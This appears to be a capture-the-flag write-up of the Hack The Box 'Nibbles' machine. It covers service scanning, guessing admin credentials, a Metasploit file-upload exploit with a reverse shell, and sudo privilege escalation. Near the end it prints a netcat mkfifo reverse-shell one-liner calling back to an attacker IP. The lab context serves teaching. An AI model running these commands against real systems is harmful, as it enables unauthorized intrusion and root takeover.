---
title: Nibbles HTB Writeup
author: 0xGamer
date: 2021-01-25 9:16:00 
categories: [Walkthru, Writeup, Hackthebox]
tags: [Nibble]
math: true
mermaid: true
---

This post contains the walkthru of the Nibbles box from hackthebox. This box has been suggested as OSCP like.

## We will start with an nmap.

### Nmap

```bash
[★]$ nmap -sC -sV -v 10.10.10.75
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-25 04:20 UTC
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### We see that port 80 (Webpage) and port 22 (SSH) are open.

 #### Lets visit the webpage.

![image-20210125095401157](https://raw.githubusercontent.com/hackarmour/hackthebox/main/assets/nibbles1.png)

#### We see a page with only Hello world! written on it... Lets check the source code

#### ![image-20210125095509153](https://raw.githubusercontent.com/hackarmour/hackthebox/main/assets/nibbles2.png)

### We see a /nibbleblog... Lets visit it 

![image-20210125095624746](https://raw.githubusercontent.com/hackarmour/hackthebox/main/assets/nibbles3.png)

### I checked the stuff but nothing interesting here on those categories and pages. Lets run  gobuster against it.

```bash 
[★]$ gobuster dir -u=10.10.10.75/nibbleblog -w=/usr/share/dirb/wordlists/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.75/nibbleblog
[+] Threads:        10
[+] Wordlist:       /usr/share/dirb/wordlists/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/01/25 04:33:04 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/admin (Status: 301)
/admin.php (Status: 200)
/content (Status: 301)
/index.php (Status: 200)
/languages (Status: 301)
/plugins (Status: 301)
/README (Status: 200)
/themes (Status: 301)
===============================================================
2021/01/25 04:34:10 Finished
===============================================================
```

#### Hmm, admin.php is interesting...

![image-20210125100619910](https://raw.githubusercontent.com/hackarmour/hackthebox/main/assets/nibbles4.png)

#### Lets try the common usernames and passwords like, admin:admin or nibbles:nibbles or admin:nibbles or nibbles:admin	

#### We see that the username admin and the password nibbles work...

![image-20210125102016119](https://raw.githubusercontent.com/hackarmour/hackthebox/main/assets/nibbles5.png)

#### We get logged in but there is nothing interesting here

### Lets use searchsploit to look for an exploit on nibbleblogs

```bash
[★]$ searchsploit nibbleblog
---------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                        |  Path
---------------------------------------------------------------------- ---------------------------------
Nibbleblog 3 - Multiple SQL Injections                                | php/webapps/35865.txt
Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)                 | php/remote/38489.rb
---------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

#### Lets start up msfconsole and use the Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)   exploit.

 ###### We are going to use this command in msfconsole to select the exploit

```bash
use exploit/multi/http/nibbleblog_file_upload
```

##### Now lets use these commands to select the payload and options

```bash
msf6 exploit(multi/http/nibbleblog_file_upload) > set payload generic/shell_reverse_tcp
```

```bash
msf6 exploit(multi/http/nibbleblog_file_upload) > set rhost 10.10.10.75
```

```bash
msf6 exploit(multi/http/nibbleblog_file_upload) > set targeturi /nibbleblog/
```

```bash
msf6 exploit(multi/http/nibbleblog_file_upload) > set username admin
```

```bash
msf6 exploit(multi/http/nibbleblog_file_upload) > set password nibbles
```

```bash
msf6 exploit(multi/http/nibbleblog_file_upload) > set lhost tun0
```

```
msf6 exploit(multi/http/nibbleblog_file_upload) > run
```

### Now you can see that we got shell as nibbler

![image-20210125103315915](https://raw.githubusercontent.com/hackarmour/hackthebox/main/assets/nibbles6.png)

#### Now lets use this command to spawn a bash shell

```python
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

### Great now we can cd /home/nibbler and cat the user flag.

#### Lets run sudo -l to check our permissions

```
nibbler@Nibbles:/home/nibbler$ sudo -l
sudo -l
sudo: unable to resolve host Nibbles: Connection timed out
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

#### Hmm we can run  monitor.sh... Let unzip the personal folder so we can access the monitor file

```
nibbler@Nibbles:/home/nibbler$ ls
personal.zip  user.txt
nibbler@Nibbles:/home/nibbler$ unzip personal.zip
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh  
nibbler@Nibbles:/home/nibbler$ cd personal/stuff
nibbler@Nibbles:/home/nibbler/personal/stuff$ ls
monitor.sh

```

#### Lets check the monitor.sh file...

```
nibbler@Nibbles:/home/nibbler/personal/stuff$ head monitor.sh
                  ####################################################################################################
                  #                                        Tecmint_monitor.sh                                        #
                  # Written for Tecmint.com for the post www.tecmint.com/linux-server-health-monitoring-script/      #
                  # If any bug, report us in the link below                                                          #
                  # Free to use/edit/distribute the code below by                                                    #
                  # giving proper credit to Tecmint.com and Author                                                   #
                  #                                                                                                  #
                  ####################################################################################################
#! /bin/bash
# unset any variable which system may be using

```

#### Lets modify the monitor.sh to get a reverse shell...

```
nibbler@Nibbles:/home/nibbler/personal/stuff$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.4 1234 > /tmp/f" >> monitor.sh
```

#### Now lets listen on port 1234 with netcat on a new terminal

```
[★]$ nc -nvlp 1234
listening on [any] 1234 ...

```

#### Now lets run the monitor.sh file on the box.

```
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo ./monitor.sh
```

#### Now can check the other terminal and we can see we got root.

```
# whoami && id && cat /root/root.txt
root
uid=0(root) gid=0(root) groups=0(root)
c8a26e...
```



# Thank you!

